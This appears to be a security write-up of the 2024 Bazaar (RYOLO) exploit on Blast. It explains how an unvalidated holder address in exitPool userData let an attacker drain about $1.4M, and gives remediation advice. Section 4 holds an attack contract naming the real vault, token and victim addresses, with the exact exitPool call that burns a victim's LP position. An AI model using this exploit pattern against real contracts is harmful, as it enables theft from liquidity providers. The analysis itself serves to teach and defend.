# Bazaar — exitPool() Arbitrary Holder Address Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-06 |
| **Protocol** | Bazaar (RYOLO) |
| **Chain** | Blast |
| **Loss** | ~$1,400,000 |
| **Balancer Vault** | [0xefb4e3Cc438eF2854727A7Df0d0baf844484EdaB](https://blastscan.io/address/0xefb4e3Cc438eF2854727A7Df0d0baf844484EdaB) |
| **RYOLO Token** | [0x86cba7808127d76deaC14ec26eF6000Aa78b2eBb](https://blastscan.io/address/0x86cba7808127d76deaC14ec26eF6000Aa78b2eBb) |
| **Arbitrary Holder** | [0xb66585C4E460D49154D50325CE60aDC44bc900E9](https://blastscan.io/address/0xb66585C4E460D49154D50325CE60aDC44bc900E9) |
| **Root Cause** | Calling `exitPool()` on the Balancer Vault with an arbitrary holder address and MAX_ETH_OUT (850M ether) parameter passed via `userData`, forcibly withdrawing a victim's liquidity |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-06/Bazaar_exp.sol) |

---

## 1. Vulnerability Overview

The Bazaar protocol uses Balancer-based pools, and the `exitPool()` function accepts a holder address via the `userData` parameter, burns that address's LP tokens, and returns the underlying assets. Because the function does not validate the holder field in `userData`, an attacker was able to forcibly close an arbitrary address's (i.e., a victim's) LP position. The attacker drained the entire liquidity using the MAX_ETH_OUT (850M ether) parameter and stole approximately $1.4M.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: no holder validation in exitPool userData
contract BazaarPool {
    function exitPool(
        bytes32 poolId,
        address sender,
        address payable recipient,
        ExitPoolRequest memory request
    ) external {
        // Extract holder address from userData — no validation
        (address holder, uint256 maxAmountOut) = abi.decode(
            request.userData, (address, uint256)
        );
        // Does not verify that holder == msg.sender
        // Attacker can pass an arbitrary victim address as holder
        uint256 lpBalance = lpToken.balanceOf(holder);
        lpToken.burnFrom(holder, lpBalance);
        _transferTokens(recipient, maxAmountOut);
    }
}

// ✅ Safe code: holder validation added
function exitPool(
    bytes32 poolId,
    address sender,
    address payable recipient,
    ExitPoolRequest memory request
) external {
    (address holder, uint256 maxAmountOut) = abi.decode(
        request.userData, (address, uint256)
    );
    // holder must be msg.sender (or an approved address)
    require(
        holder == msg.sender || isApprovedForAll(holder, msg.sender),
        "unauthorized holder"
    );
    uint256 lpBalance = lpToken.balanceOf(holder);
    lpToken.burnFrom(holder, lpBalance);
    _transferTokens(recipient, maxAmountOut);
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Balancer Vault.exitPool(
  │         poolId    = RYOLO pool ID,
  │         sender    = attacker,
  │         recipient = attacker,
  │         userData  = abi.encode(
  │             holder     = 0xb66585C4E460D49154D50325CE60aDC44bc900E9,  ← victim
  │             maxAmountOut = 850_000_000 ether  ← entire liquidity
  │         )
  │       )
  │         └─ No holder validation → entire victim LP burned
  │         └─ Victim's liquidity → transferred to attacker address
  │
  └─→ [2] ~$1.4M RYOLO/ETH stolen
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IBalancerVault {
    struct ExitPoolRequest {
        address[] assets;
        uint256[] minAmountsOut;
        bytes userData;
        bool toInternalBalance;
    }

    function exitPool(
        bytes32 poolId,
        address sender,
        address payable recipient,
        ExitPoolRequest memory request
    ) external;
}

contract AttackContract {
    IBalancerVault constant vault = IBalancerVault(0xefb4e3Cc438eF2854727A7Df0d0baf844484EdaB);
    address constant victim = 0xb66585C4E460D49154D50325CE60aDC44bc900E9;
    IERC20 constant RYOLO = IERC20(0x86cba7808127d76deaC14ec26eF6000Aa78b2eBb);

    function testExploit() external {
        bytes32 poolId = /* RYOLO pool ID */;

        address[] memory assets = new address[](2);
        assets[0] = address(RYOLO);
        assets[1] = address(WETH);

        uint256[] memory minAmounts = new uint256[](2);
        // minAmounts = 0 (no minimum amount restriction)

        // Encode victim address + MAX_ETH_OUT into userData
        bytes memory userData = abi.encode(
            victim,            // holder = victim (no validation)
            850_000_000 ether  // MAX_ETH_OUT
        );

        IBalancerVault.ExitPoolRequest memory request = IBalancerVault.ExitPoolRequest({
            assets: assets,
            minAmountsOut: minAmounts,
            userData: userData,
            toInternalBalance: false
        });

        // Call exitPool — drains victim's entire liquidity without holder validation
        vault.exitPool(poolId, address(this), payable(address(this)), request);

        // Handle received RYOLO/WETH
        uint256 profit = RYOLO.balanceOf(address(this));
        // ~$1.4M worth stolen
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Missing validation of arbitrary holder address in userData |
| **CWE** | CWE-284: Improper Access Control |
| **Attack Vector** | External (exitPool userData manipulation) |
| **DApp Classification** | Balancer fork liquidity pool |
| **Impact** | Victim LP position forcibly closed → $1.4M stolen |

## 6. Remediation Recommendations

1. **Mandatory holder validation**: Add `require(holder == msg.sender || isApprovedForAll(holder, msg.sender))`
2. **userData parameter allowlisting**: Only permit approved exit types to be processed via userData
3. **LP burn authorization**: `burnFrom` must only be permitted for approved callers
4. **Maximum withdrawal limit**: Cap the maximum amount withdrawable in a single transaction

## 7. Lessons Learned

- In Balancer forks, the pattern of burning an arbitrary address's LP via the `exitPool()` `userData` parameter becomes a critical vulnerability without holder validation.
- Functions in the `burnFrom` family must always go through caller approval (allowance/approval) verification.
- The pattern of passing a maximum value (MAX_ETH_OUT = 850M ether) to bypass slippage restrictions is a textbook example of vulnerable parameter validation.